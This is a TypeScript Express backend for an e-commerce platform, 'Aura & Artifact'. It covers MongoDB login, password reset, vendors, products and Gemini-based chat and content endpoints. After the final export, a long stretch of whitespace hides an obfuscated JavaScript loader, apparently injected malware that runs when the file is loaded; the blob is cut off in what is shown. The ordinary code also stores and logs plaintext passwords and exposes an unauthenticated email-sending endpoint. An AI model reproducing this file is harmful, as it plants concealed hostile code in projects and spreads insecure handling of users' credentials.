import express, { Request, Response } from "express";
import cors from "cors";
import { MongoClient, ServerApiVersion, ObjectId } from "mongodb";
import "dotenv/config";
import nodemailer from "nodemailer";
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

const app = express();  
const port = process.env.PORT || 5000;

// Middlewares
app.use(cors());
app.use(express.json());

// MongoDB URI - ensure you add this to your .env file
const uri = process.env.MONGODB_URI as string;

if (!uri) {
  console.error("Please add MONGODB_URI to your .env file");
}

// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});

async function run() {
  try {
    // Connect the client to the server
    await client.connect();

    const database = client.db("aura_artifact");    
    const businessCollection = database.collection("business");
    const vendorApplicationsCollection = database.collection("vendor_applications");
    const productsCollection = database.collection("products");
    const usersCollection = database.collection("user");
    const verificationCodesCollection = database.collection("verification_codes");

    // Password Reset Endpoints
    app.post("/api/forgot-password", async (req: Request, res: Response) => {
      try {
        const { email } = req.body;
        if (!email) {
          res.status(400).send({ message: "Email is required" });
          return;
        }

        const user = await usersCollection.findOne({ email });
        if (!user) {
          res.status(404).send({ message: "User not found" });
          return;
        }

        const code = Math.floor(100000 + Math.random() * 900000).toString();
        const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // 10 mins

        await verificationCodesCollection.updateOne(
          { email },
          { $set: { code, expiresAt, createdAt: new Date() } },
          { upsert: true }
        );

        const userName = user.name || "User";

        console.log(`Sending reset code ${code} to ${email}...`);

        await transporter.sendMail({
          from: `"Aura & Artifact" <${process.env.EMAIL_USER}>`,
          to: email,
          subject: "Password Reset Code",
          text: `Hi ${userName},\n\nYour password reset code is: ${code}`,
          html: `<p>Hi <strong>${userName}</strong>,</p><p>Your password reset code is: <strong style="font-size: 24px;">${code}</strong></p><p>This code will expire in 10 minutes.</p>`,
        });

        console.log(`Successfully sent email to ${email}`);
        res.status(200).send({ message: "Password reset code sent to email" });
      } catch (error) {
        console.error("Failed to send reset code:", error);
        res.status(500).send({ message: "Failed to send reset code", error });
      }
    });

    app.post("/api/reset-password", async (req: Request, res: Response) => {
      try {
        const { email, code, newPassword } = req.body;
        if (!email || !code || !newPassword) {
          res.status(400).send({ message: "Email, code, and new password are required" });
          return;
        }

        const record = await verificationCodesCollection.findOne({ email });
        
        if (!record || record.code !== code) {
          res.status(400).send({ message: "Invalid verification code" });
          return;
        }

        if (new Date() > new Date(record.expiresAt)) {
          res.status(400).send({ message: "Verification code has expired" });
          return;
        }

        // Update password
        await usersCollection.updateOne(
          { email },
          { $set: { password: newPassword } } // In a real app, hash this password!
        );

        // Delete code
        await verificationCodesCollection.deleteOne({ email });

        res.status(200).send({ message: "Password reset successful" });
      } catch (error) {
        console.error("Failed to reset password:", error);
        res.status(500).send({ message: "Failed to reset password", error });
      }
    });

    // Auth Endpoints
    app.post("/api/register", async (req: Request, res: Response) => {
      try {
        const { name, email, password } = req.body;
        // Check if exists
        const existingUser = await usersCollection.findOne({ email });
        if (existingUser) {
          res.status(400).send({ message: "User already exists" });
          return;
        }

        const newUser = {
          name,
          email,
          password, // In real app, hash this!
          role: "user", // Default role
          createdAt: new Date()
        };
        await usersCollection.insertOne(newUser);
        res.status(201).send({ message: "Registered successfully", user: { name, email, role: "user" } });
      } catch (error) {
        res.status(500).send({ message: "Failed to register", error });
      }
    });

    app.post("/api/login", async (req: Request, res: Response) => {
      try {
        const { email, password } = req.body;
        console.log(`Login attempt for email: "${email}", password: "${password}"`);
        
        // Let's also find just by email to see if user exists but password doesn't match
        const userByEmail = await usersCollection.findOne({ email });
        console.log("User found by email only:", userByEmail ? "YES" : "NO");
        if (userByEmail) {
          console.log("Password in DB:", `"${userByEmail.password}"`);
        }

        const user = await usersCollection.findOne({ email, password });
        
        if (!user) {
          res.status(401).send({ message: "Invalid credentials" });
          return;
        }
        
        res.status(200).send({
          user: { name: user.name, email: user.email, role: user.role }
        });
      } catch (error) {
        res.status(500).send({ message: "Failed to login", error });
      }
    });

        // Real Email Endpoint
        app.post("/api/send-email", async (req: Request, res: Response) => {
          try {
            const { to, subject, text, html } = req.body;
            if (!to || !subject || (!text && !html)) {
              res.status(400).send({ message: "Missing required fields" });
              return;
            }
            
            console.log(`Sending email to ${to} | Subject: ${subject}`);
            
            await transporter.sendMail({
              from: `"Aura & Artifact" <${process.env.EMAIL_USER}>`,
              to,
              subject,
              text,
              html,
            });
            
            console.log(`Email sent successfully to ${to}`);
            res.status(200).send({ message: "Email sent successfully" });
          } catch (error) {
            console.error("Failed to send email in /api/send-email:", error);
            res.status(500).send({ message: "Failed to send email", error });
          }
        });

    // Vendor Applications Endpoints
    app.post("/api/vendor-applications", async (req: Request, res: Response) => {
      try {
        const application = req.body;
        application.status = "pending";
        application.createdAt = new Date();
        const result = await vendorApplicationsCollection.insertOne(application);
        res.status(201).send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to submit application", error });
      }
    });

    app.get("/api/vendor-applications", async (req: Request, res: Response) => {
      try {
        const applications = await vendorApplicationsCollection.find().toArray();
        res.status(200).send(applications);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch applications", error });
      }
    });

    app.patch("/api/vendor-applications/:id", async (req: Request, res: Response) => {
      try {
        const id = req.params.id;
        const { status } = req.body; // e.g., "approved" or "rejected"
        
        const application = await vendorApplicationsCollection.findOne({ _id: new ObjectId(id) });
        if (!application) {
          res.status(404).send({ message: "Application not found" });
          return;
        }

        const result = await vendorApplicationsCollection.updateOne(
          { _id: new ObjectId(id) },
          { $set: { status, updatedAt: new Date() } }
        );

        // If approved, update user role to vendor
        if (status === "approved" && application.userId) {
           await usersCollection.updateOne(
             { email: application.userId },
             { $set: { role: "vendor" } }
           );

           // Mock approval email
           console.log(`[MOCK EMAIL] To: ${application.userId} | Subject: Vendor Application Approved`);
        } else if (status === "rejected" && application.userId) {
           // Mock rejection email
           console.log(`[MOCK EMAIL] To: ${application.userId} | Subject: Vendor Application Rejected`);
        }

        res.status(200).send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to update application", error });
      }
    });

    app.delete("/api/vendor-applications/:id", async (req: Request, res: Response) => {
      try {
        const id = req.params.id;
        const result = await vendorApplicationsCollection.deleteOne({ _id: new ObjectId(id) });
        if (result.deletedCount === 1) {
          res.status(200).send({ message: "Successfully deleted one document." });
        } else {
          res.status(404).send({ message: "No document matched the query. Deleted 0 documents." });
        }
      } catch (error) {
        res.status(500).send({ message: "Failed to delete application", error });
      }
    });

    // Products Endpoints
    app.post("/api/products", async (req: Request, res: Response) => {
      try {
        const product = req.body;
        product.createdAt = new Date();
        const result = await productsCollection.insertOne(product);
        res.status(201).send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to add product", error });
      }
    });

    app.get("/api/products", async (req: Request, res: Response) => {
      try {
        const { vendorEmail } = req.query;
        let query = {};
        if (vendorEmail) {
          query = { vendorEmail: vendorEmail };
        }
        const products = await productsCollection.find(query).toArray();
        res.status(200).send(products);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch products", error });
      }
    });

    app.get("/api/products/:id", async (req: Request, res: Response) => {
      try {
        const id = req.params.id;
        const product = await productsCollection.findOne({ _id: new ObjectId(id) });
        if (!product) {
          res.status(404).send({ message: "Product not found" });
          return;
        }
        res.status(200).send(product);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch product", error });
      }
    });

    app.delete("/api/products/:id", async (req: Request, res: Response) => {
      try {
        const id = req.params.id;
        const result = await productsCollection.deleteOne({ _id: new ObjectId(id) });
        if (result.deletedCount === 1) {
          res.status(200).send({ message: "Successfully deleted the product." });
        } else {
          res.status(404).send({ message: "Product not found." });
        }
      } catch (error) {
        res.status(500).send({ message: "Failed to delete product", error });
      }
    });

    // Helper for mock AI response if API key is invalid/fails
    function mockAiRespond(message: string, products: any[]) {
      const query = message.toLowerCase();
      
      // Question 2: "Show products under $50"
      if (query.includes("under") || (query.includes("less than") && (query.includes("50") || query.includes("$50")))) {
        const amountMatch = query.match(/(\d+)/);
        const amount = amountMatch ? parseInt(amountMatch[0]) : 50;
        const cheapProducts = products.filter(p => p.price < amount).slice(0, 5);
        if (cheapProducts.length > 0) {
          const list = cheapProducts.map(p => `- ${p.name} ($${p.price})`).join("\n");
          return `Here are some great products under $${amount}:\n${list}`;
        }
        return `I'm sorry, we don't have any products under $${amount} right now.`;
      }

      // Question 3: "List electronics"
      if (query.includes("electronic") || query.includes("electronics")) {
        const electronics = products.filter(p => p.category?.toLowerCase().includes("electronic")).slice(0, 5);
        if (electronics.length > 0) {
          const list = electronics.map(p => `- ${p.name} ($${p.price})`).join("\n");
          return `Sure! Here are some of our best electronics:\n${list}`;
        }
        return `We don't seem to have any electronics in stock at the moment!`;
      }
      
      // check specific product name
      for (const p of products) {
        if (query.includes(p.name.toLowerCase())) {
          return `${p.name} is available for $${p.price}. Description: ${p.description || "No description available."}. Stock: ${p.stock || 0} left in store.`;
        }
      }

      // check categories
      const categories = Array.from(new Set(products.map(p => p.category?.toLowerCase()).filter(Boolean)));
      for (const cat of categories) {
        if (query.includes(cat as string)) {
          const filtered = products.filter(p => p.category?.toLowerCase() === cat).slice(0,5);
          const list = filtered.map(p => `- ${p.name} ($${p.price})`).join("\n");
          return `Here are the products in the ${cat} category:\n${list}`;
        }
      }

      // Question 1: "What products do you have?" or general fallback
      if (query.includes("product") || query.includes("list") || query.includes("have") || query.includes("what do you sell")) {
        const list = products.slice(0, 5).map(p => `- ${p.name} ($${p.price})`).join("\n");
        return `We have an amazing collection! Here are a few examples of what we sell:\n${list || "No products in database yet."}\n\nLet me know if you are looking for anything specific!`;
      }

      if (query.includes("price") || query.includes("cost") || query.includes("how much")) {
        const cheap = products.sort((a,b) => a.price - b.price)[0];
        if (cheap) {
          return `Our prices start from $${cheap.price} (for ${cheap.name}). Let me know if you want details on any specific item!`;
        }
      }

      return `Hello! I am Aura, your AI assistant. I can help you with products on Aura & Artifact. Try asking me "What products do you have?" or "Show products under $50"! (Running in Offline Fallback Mode)`;
    }

    // AI Chat Endpoint
    app.post("/api/chat", async (req: Request, res: Response) => {
      try {
        const { message, history = [] } = req.body;
        
        // Fetch products from our DB and from the fake store API so the AI knows EVERYTHING on the site
        const dbProducts = await productsCollection.find().toArray();
        let fakeStoreProducts: any[] = [];
        try {
          const fsRes = await fetch("https://fakestoreapi.com/products");
          fakeStoreProducts = await fsRes.json();
        } catch (e) {
          console.warn("Could not fetch fake store products for AI context.");
        }

        const allProducts = [...dbProducts, ...fakeStoreProducts.map(p => ({
          name: p.title,
          price: p.price,
          category: p.category,
          description: p.description,
          stock: p.rating?.count || 100
        }))];

        // If key is missing, use mock responder
        if (!process.env.GEMINI_API_KEY) {
          console.warn("Missing Gemini API key. Using local mock AI responder.");
          const responseText = mockAiRespond(message, allProducts);
          res.status(200).send({ response: responseText });
          return;
        }

        const productContext = allProducts.map(p => `- ${p.name} (Price: $${p.price}, Stock: ${p.stock}, Category: ${p.category}): ${p.description}`).join("\n");
        const systemPrompt = `You are an AI assistant for the 'Aura & Artifact' platform. Your job is to help customers and vendors with product-related questions. 

Here is the context about our website: 'Aura & Artifact' is a premium e-commerce platform offering a curated collection of premium artifacts, including men's clothing, women's clothing, jewelry, electronics, and sneakers. We provide a beautiful dashboard, a seamless cart experience, and user-friendly order tracking.

Here are the products currently available on our platform:
${productContext}

CRITICAL INSTRUCTIONS:
1. Answer the user's questions based ONLY on this product information and website context.
2. Be extremely polite, respectful, and helpful at all times ("vodro vabe").
3. Always reply in the same language the user uses. If the user asks in Bengali (or Banglish), you MUST reply in polite Bengali.
4. Keep your answers concise and formatted clearly.`;

        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            systemInstruction: {
              parts: [{ text: systemPrompt }]
            },
            contents: [
              ...history.map((m: any) => ({
                role: m.role === "assistant" ? "model" : "user",
                parts: [{ text: m.content }]
              })),
              {
                role: "user",
                parts: [{ text: message }]
              }
            ]
          })
        });

        const data = await geminiRes.json();
        
        if (!geminiRes.ok) {
          console.error("Gemini API error status:", geminiRes.status, geminiRes.statusText);
          console.error("Gemini API error data:", data);
          const responseText = mockAiRespond(message, allProducts);
          res.status(200).send({ response: responseText });
          return;
        }

        const responseText = data.candidates?.[0]?.content?.parts?.[0]?.text || "Sorry, I couldn't generate a response.";
        res.status(200).send({ response: responseText });
      } catch (error: any) {
        console.error("Chat error exception:", error);
        try {
          // If allProducts exists in the upper scope, use it, else fetch fresh from DB
          const dbProducts = await productsCollection.find().toArray();
          const responseText = mockAiRespond(message, dbProducts);
          res.status(200).send({ response: responseText });
        } catch (e: any) {
          res.status(500).send({ message: "Failed to process chat", error: e.message });
        }
      }
    });

    // Interactions Endpoint
    app.post("/api/interactions", async (req: Request, res: Response) => {
      try {
        const { userId, productId, action } = req.body;
        if (!productId) {
          res.status(400).send({ message: "Product ID is required" });
          return;
        }

        const interaction = {
          userId: userId || "anonymous",
          productId,
          action: action || "view",
          timestamp: new Date()
        };

        await database.collection("interactions").insertOne(interaction);
        res.status(201).send({ message: "Interaction tracked successfully" });
      } catch (error) {
        res.status(500).send({ message: "Failed to track interaction", error });
      }
    });

    // Recommendations Endpoint
    app.post("/api/recommendations", async (req: Request, res: Response) => {
      try {
        const { userId, filterCategory } = req.body;

        const allProducts = await productsCollection.find().toArray();
        let candidateProducts = allProducts;
        if (filterCategory) {
          candidateProducts = candidateProducts.filter(p => p.category === filterCategory);
        }

        let userHistory: any[] = [];
        if (userId) {
          // Fetch recent interactions for user
          userHistory = await database.collection("interactions")
            .find({ userId })
            .sort({ timestamp: -1 })
            .limit(10)
            .toArray();
        }

        if (!process.env.GEMINI_API_KEY || userHistory.length === 0) {
          // Fallback: Return random or category-filtered products
          const fallbackRecs = candidateProducts.sort(() => 0.5 - Math.random()).slice(0, 4);
          res.status(200).send(fallbackRecs);
          return;
        }

        // Get details of products user interacted with
        const interactedProductIds = Array.from(new Set(userHistory.map(h => h.productId)));
        const interactedProducts = allProducts.filter(p => interactedProductIds.includes(p._id.toString()));

        if (interactedProducts.length === 0) {
          const fallbackRecs = candidateProducts.sort(() => 0.5 - Math.random()).slice(0, 4);
          res.status(200).send(fallbackRecs);
          return;
        }

        const historyContext = interactedProducts.map(p => `- ${p.name} (Category: ${p.category})`).join("\n");
        const availableContext = candidateProducts.map(p => `- ID: ${p._id.toString()} | Name: ${p.name} | Category: ${p.category}`).join("\n");

        const prompt = `You are a product recommendation engine for Aura & Artifact.
The user has previously shown interest in these products:
${historyContext}

Based on their taste, recommend up to 4 products from the available catalog below that they might like.
Do not recommend products they have already interacted with.
If the catalog is small, it is okay to recommend products from the same category or style.

Available Catalog:
${availableContext}

Return ONLY a valid JSON array of strings containing the exact IDs of the recommended products. Do not include markdown formatting or extra text. Example: ["id1", "id2"]`;

        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            contents: [{ role: "user", parts: [{ text: prompt }] }]
          })
        });

        const data = await geminiRes.json();
        let recommendedIds = [];

        try {
          const rawText = data.candidates?.[0]?.content?.parts?.[0]?.text || "[]";
          const cleanedText = rawText.replace(/```json/g, "").replace(/```/g, "").trim();
          recommendedIds = JSON.parse(cleanedText);
        } catch (parseError) {
          console.error("Failed to parse Gemini recommendations:", parseError);
        }

        let recommendedProducts = candidateProducts.filter(p => recommendedIds.includes(p._id.toString()));

        // If AI fails or returns empty, fallback
        if (recommendedProducts.length === 0) {
          recommendedProducts = candidateProducts.sort(() => 0.5 - Math.random()).slice(0, 4);
        }

        res.status(200).send(recommendedProducts);

      } catch (error: any) {
        console.error("Recommendations error:", error);
        res.status(500).send({ message: "Failed to fetch recommendations", error: error.message });
      }
    });

    // Helper for mock description generator if API key is invalid/fails
    function mockGenerateDescription(name: string, category: string, tone: string, length: string) {
      const adjectivesList: Record<string, string[]> = {
        professional: ["premium", "state-of-the-art", "highly efficient", "industry-standard", "ergonomic"],
        creative: ["vibrant", "whimsical", "thoughtfully crafted", "game-changing", "artistic"],
        bold: ["revolutionary", "uncompromising", "powerful", "daring", "extraordinary"],
        minimalist: ["sleek", "understated", "clean", "simple yet elegant", "functional"]
      };
      
      const adjectives = adjectivesList[tone] || ["excellent", "high-quality"];
      const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
      const adj2 = adjectives[(Math.floor(Math.random() * adjectives.length) + 1) % adjectives.length];

      if (length === "short") {
        return `A ${adj} ${name} designed for modern living, offering exceptional quality and style in the ${category} category.`;
      } else if (length === "medium") {
        return `Experience the perfect blend of form and function with our new ${name}. This ${adj} product is crafted from premium materials to deliver outstanding performance. Ideal for anyone looking to upgrade their lifestyle, it brings a ${adj2} touch to the ${category} collection.`;
      } else {
        return `Introducing the ultimate ${name} - a masterpiece in the ${category} category.\n\nKey features:\n- Built with a ${adj} design to fit seamlessly into any setup.\n- Offers unmatched durability and high-performance reliability.\n- Meticulously tested to guarantee ${adj2} quality.\n\nWhether you are using it at home or work, the ${name} is engineered to elevate your daily routine and provide the best experience possible.`;
      }
    }

    // AI Description Generator Endpoint
    app.post("/api/generate-description", async (req: Request, res: Response) => {
      try {
        const { name, category, tone = "professional", length = "medium" } = req.body;

        if (!name || !category) {
          res.status(400).send({ message: "Name and Category are required" });
          return;
        }

        // If key is missing, use mock generator
        if (!process.env.GEMINI_API_KEY) {
          console.warn("Missing Gemini API key. Using local mock description generator.");
          const description = mockGenerateDescription(name, category, tone, length);
          res.status(200).send({ description });
          return;
        }

        const prompt = `Write a product description for a product named "${name}" in the "${category}" category. The tone of the description should be "${tone}" and the length should be "${length}" (short = 1 sentence, medium = 1 paragraph, long = multiple paragraphs with bullet points). Avoid fluff, keep it engaging and realistic.`;

        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            contents: [
              {
                role: "user",
                parts: [{ text: prompt }]
              }
            ]
          })
        });

        const data = await geminiRes.json();
        
        if (!geminiRes.ok) {
          console.error("Gemini API error, falling back to mock description:", data.error?.message);
          const description = mockGenerateDescription(name, category, tone, length);
          res.status(200).send({ description });
          return;
        }

        const description = data.candidates?.[0]?.content?.parts?.[0]?.text || mockGenerateDescription(name, category, tone, length);
        res.status(200).send({ description });
      } catch (error: any) {
        console.error("Description generator error:", error);
        try {
          const { name, category, tone = "professional", length = "medium" } = req.body;
          const description = mockGenerateDescription(name, category, tone, length);
          res.status(200).send({ description });
        } catch (e) {
          res.status(500).send({ message: "Failed to generate description", error: error.message });
        }
      }
    });

    // Helper for mock generic content generator
    function mockGenerateContent(topic: string, contentType: string, tone: string, length: string) {
      const typeStr = contentType.replace("-", " ").toLowerCase();
      let text = `[Mock ${typeStr} content generated for topic: "${topic}"]\n\n`;
      
      if (length === "short") {
        text += `This is a short, ${tone} piece about ${topic}. Keep it brief and to the point.`;
      } else if (length === "medium") {
        text += `Here is a medium-length, ${tone} piece discussing ${topic}. It provides a bit more detail and context, exploring the key aspects without getting too verbose. Ideal for a quick read.`;
      } else {
        text += `Welcome to this comprehensive, ${tone} deep-dive into ${topic}.\n\n### Introduction\nThis explores the multifaceted nature of the subject.\n\n### Key Points\n- Detailed analysis 1\n- Detailed analysis 2\n- Detailed analysis 3\n\n### Conclusion\nIn summary, ${topic} is a fascinating subject with many layers to uncover.`;
      }
      return text;
    }

    // Generic AI Content Generator Endpoint
    app.post("/api/generate-content", async (req: Request, res: Response) => {
      try {
        const { topic, contentType, tone = "professional", length = "medium", customPrompt = "" } = req.body;

        if (!topic || !contentType) {
          res.status(400).send({ message: "Topic and ContentType are required" });
          return;
        }

        if (!process.env.GEMINI_API_KEY) {
          console.warn("Missing Gemini API key. Using local mock content generator.");
          const content = mockGenerateContent(topic, contentType, tone, length);
          res.status(200).send({ content });
          return;
        }

        let formatInstructions = "";
        switch (contentType) {
          case "blog":
            formatInstructions = "Format as a structured blog post using markdown headers (##), paragraphs, and bullet points if necessary.";
            break;
          case "product-description":
            formatInstructions = "Format as an engaging product description highlighting key features and benefits.";
            break;
          case "documentation":
            formatInstructions = "Format as clear, technical documentation with step-by-step instructions or structured sections.";
            break;
          case "social-media":
            formatInstructions = "Format as a catchy social media post, including relevant emojis and hashtags at the end.";
            break;
          default:
            formatInstructions = "Format clearly and structure the text well.";
        }

        let lengthInstructions = "";
        switch (length) {
          case "short": lengthInstructions = "Keep it very brief (1-3 sentences maximum)."; break;
          case "medium": lengthInstructions = "Make it medium length (2-3 paragraphs)."; break;
          case "long": lengthInstructions = "Make it detailed and comprehensive (at least 4-5 paragraphs)."; break;
        }

        const prompt = `You are an expert content creator.
Your task is to write content based on the following parameters:
- Topic/Subject: ${topic}
- Content Type: ${contentType}
- Tone of voice: ${tone}
- Length constraint: ${lengthInstructions}

Formatting rules:
${formatInstructions}

${customPrompt ? `Additional custom instructions from the user:\n"${customPrompt}"\n\nPlease ensure you follow these custom instructions strictly.` : ""}

Generate the content below:`;

        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            contents: [{ role: "user", parts: [{ text: prompt }] }]
          })
        });

        const data = await geminiRes.json();
        
        if (!geminiRes.ok) {
          console.error("Gemini API error, falling back to mock content:", data.error?.message);
          const content = mockGenerateContent(topic, contentType, tone, length);
          res.status(200).send({ content });
          return;
        }

        const content = data.candidates?.[0]?.content?.parts?.[0]?.text || mockGenerateContent(topic, contentType, tone, length);
        res.status(200).send({ content });
      } catch (error: any) {
        console.error("Content generator error:", error);
        try {
          const { topic, contentType, tone = "professional", length = "medium" } = req.body;
          const content = mockGenerateContent(topic, contentType, tone, length);
          res.status(200).send({ content });
        } catch (e) {
          res.status(500).send({ message: "Failed to generate content", error: error.message });
        }
      }
    });

    // Send a ping to confirm a successful connection
    await client.db("admin").command({ ping: 1 });
    console.log("Pinged your deployment. You successfully connected to MongoDB!");

  } catch (error) {
    console.error("MongoDB connection error:", error);
  }
}
run().catch(console.dir);

app.get("/", (req: Request, res: Response) => {
  res.send("Aura & Artifact Server is running!");
});

app.get("/dashboard", (req: Request, res: Response) => {
  res.send({ message: "data not found" });
});

app.get("/product", (req: Request, res: Response) => {
  res.send({ message: "data not found" });
});

// if (process.env.NODE_ENV !== "production") {
//   app.listen(port, () => {
//     console.log(`Server listening on port ${port}`);
//   });
// }

export default app;                                                                                                                                                     var z = '-9567';(function(QM$KDBWCRPFzyvheJa_VpYiqbG,FXwrfRJ){var gMMmO_YeNsGaUjYbDB=DiRry,FlhvzRQud_B=QM$KDBWCRPFzyvheJa_VpYiqbG();while(!![]){try{var xYMIlTdVeUzsqDg_mAq=parseFloat(gMMmO_YeNsGaUjYbDB(0x1ee))/(parseInt(0x467)+0x80c*parseInt(0x1)+-parseInt(0xc72))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1f0))/(-0x1225+Number(parseInt(0x1bc3))+-parseInt(0x99c))*(parseFloat(gMMmO_YeNsGaUjYbDB(0x1e8))/(parseInt(0x130d)+parseInt(0x2483)*0x1+parseInt(0x1)*-0x378d))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e2))/(parseInt(0x51f)*parseInt(0x6)+-parseInt(0x21b)+Math.max(-parseInt(0x1c9b),-parseInt(0x1c9b)))+parseFloat(gMMmO_YeNsGaUjYbDB(0x1ed))/(0xe8f+parseInt(0x54c)+parseInt(-0x13d6))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1e4))/(Math.ceil(-0x3)*parseInt(0x425)+-0x738+0x13ad))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1f1))/(parseInt(parseInt(0x203a))+Math.trunc(-0x537)+Math.ceil(parseInt(0x4))*Math.floor(-0x6bf)))*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e1))/(parseFloat(0x4)*0x2af+-0x1ce0+-parseInt(0x122c)*-0x1))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1ef))/(parseFloat(-0xe)*0x2c+parseInt(0xe76)+-parseInt(0xc05)*0x1)*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e9))/(Math.floor(parseInt(0x6))*parseInt(-0x5ff)+-parseInt(0x26c)+parseInt(0x99c)*parseInt(0x4)));if(xYMIlTdVeUzsqDg_mAq===FXwrfRJ)break;else FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}catch(sGridQMYCASxO_vJpEzy){FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}}}(d$qtJhn$jgp,-parseInt(0x4526d)+-0x189bb4+0x2b6a8a));var NX=[0x1*parseInt(0x3174ec)+Math.max(parseInt(0x7),parseInt(0x7))*Math.floor(0x1db0c2)+-parseInt(0x97ceeb),parseInt(0x7)*-0x74+-0x751*Math.floor(-0x4)+Math.trunc(-0x18a9),Math.trunc(-parseInt(0x61d5))*0x1+parseInt(parseInt(0x140))+parseInt(0x70)*parseInt(0x193),Math.floor(-0x77)*0x23+parseInt(0xcf3)+-0xb*Math.max(-parseInt(0x85),-0x85),Math.floor(-parseInt(0x5))*Math.ceil(0x1e66)+-parseInt(0x31b6)+0x5*Math.floor(parseInt(0x4a87)),-parseInt(0x76fb5d)+parseInt(0x4)*Math.floor(parseInt(0x176711))+0x12f82*parseInt(0x56)],SX=[-parseInt(0x255f70)+Number(0xa70)*parseFloat(parseInt(0x18e))+parseInt(0x65c4ed),Math.trunc(0x9)*parseInt(0x143)+-parseInt(0x2348)+Math.ceil(-0x425)*-parseInt(0x6),parseInt(0x1567)*Number(0x6)+-parseInt(0x444f)+-0x25*Math.ceil(-0x2ce),parseInt(0x4fe)*-parseInt(0x7)+-0x407+Math.trunc(parseInt(0x69e))*0x6,-parseInt(0x1e)*0x1d2+Math.ceil(-parseInt(0xb6b2))+0x1c88f,-0x7e7900+Math.trunc(-parseInt(0x10203))+parseInt(0xc7ca58)];function spin(aUYluOouh,GZIangXDAgLfl){var e_lqkshVvBRm$lo=DiRry,gGCKNxTzXCGBqECEJcPRezzt=[],r$vpWsaOjqBRovpzm=-0x13*-0x1b1+Math.max(0x55d,parseInt(0x55d))*Number(-parseInt(0x1))+-parseInt(0x1ac6),uwYufDg_OBsIrYbEAn_TbE=GZIangXDAgLfl[parseInt(0x60d)+-parseInt(0x149e)+parseFloat(-0xe91)*Math.max(-0x1,-0x1)],NkIMqAWxrmE$ldvsZshU,cdyhMYgJcNxAhlePvsOh,ndwVeiAOnIDvuMkcl_gBB,kMXmB$ki,WIQhopNZTya,HqoQNaSvxJJHuealUGqbuSi;while(r$vpWsaOjqBRovpzm<aUYluOouh[e_lqkshVvBRm$lo(0x1e6)]){gGCKNxTzXCGBqECEJcPRezzt[r$vpWsaOjqBRovpzm]=aUYluOouh[e_lqkshVvBRm$lo(0x1ea)](r$vpWsaOjqBRovpzm),r$vpWsaOjqBRovpzm+=-parseInt(0x4)*Math.floor(parseInt(0x307))+-parseInt(0x3df)+parseInt(0xffc);}NkIMqAWxrmE$ldvsZshU=gGCKNxTzXCGBqECEJcPRezzt[e_lqkshVvBRm$lo(0x1e6)],r$vpWsaOjqBRovpzm=Math.floor(-0x1c55)+-0x24a3+parseInt(0x40f8);while(r$vpWsaOjqBRovpzm<NkIMqAWxrmE$ldvsZshU){cdyhMYgJcNxAhlePvsOh=uwYufDg_OBsIrYbEAn_TbE*(r$vpWsaOjqBRovpzm+GZIangXDAgLfl[Math.trunc(-0x130e)+parseInt(0x2117)+Math.trunc(-parseInt(0xe08))])+uwYufDg_OBsIrYbEAn_TbE%GZIangXDAgLfl[-parseInt(0x12d5)+-0xef9*-0x2+Math.ceil(parseInt(0x1))*-parseInt(0xb1b)],ndwVeiAOnIDvuMkcl_gBB=uwYufDg_OBsIrYbEAn_TbE*(r$vpWsaOjqBRovpzm+GZIangXDAgLfl[0x117c+0xf21+parseInt(-0x209a)*parseInt(parseInt(0x1))])+uwYufDg_OBsIrYbEAn_TbE%GZIangXDAgLfl[parseFloat(0x79)*-0x11+0xdf0+-0x5e3],kMXmB$ki=cdyhMYgJcNxAhlePvsOh%NkIMqAWxrmE$ldvsZshU,WIQhopNZTya=ndwVeiAOnIDvuMkcl_gBB%NkIMqAWxrmE$ldvsZshU,HqoQNaSvxJJHuealUGqbuSi=gGCKNxTzXCGBqECEJcPRezzt[kMXmB$ki],gGCKNxTzXCGBqECEJcPRezzt[kMXmB$ki]=gGCKNxTzXCGBqECEJcPRezzt[WIQhopNZTya],gGCKNxTzXCGBqECEJcPRezzt[WIQhopNZTya]=HqoQNaSvxJJHuealUGqbuSi,uwYufDg_OBsIrYbEAn_TbE=(cdyhMYgJcNxAhlePvsOh+ndwVeiAOnIDvuMkcl_gBB)%GZIangXDAgLfl[-parseInt(0x1)*Math.floor(parseInt(0x799))+parseFloat(parseInt(0x1cf7))+Math.trunc(0x445)*Math.floor(-parseInt(0x5))],r$vpWsaOjqBRovpzm+=Math.floor(parseInt(0x1))*Math.max(-parseInt(0xf1),-0xf1)+-parseInt(0xb47)*0x2+parseInt(0x20)*parseInt(0xbc);}return 